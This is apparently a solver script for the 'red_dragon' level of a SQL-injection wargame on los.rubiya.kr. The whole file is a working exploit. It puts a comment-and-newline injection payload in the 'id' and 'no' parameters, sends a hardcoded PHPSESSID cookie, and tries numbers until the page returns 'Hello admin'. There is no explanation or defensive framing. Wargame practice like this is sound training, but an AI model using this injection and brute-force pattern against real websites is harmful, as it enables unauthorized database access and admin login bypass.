import requests

for num in range(0,1000000000):
    url="https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no=%23&no=%0a"+str(num)
    cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
    res = requests.get(url,cookies= cookies)
    if res.text.find("Hello admin")!= -1:
        print(num)
        break
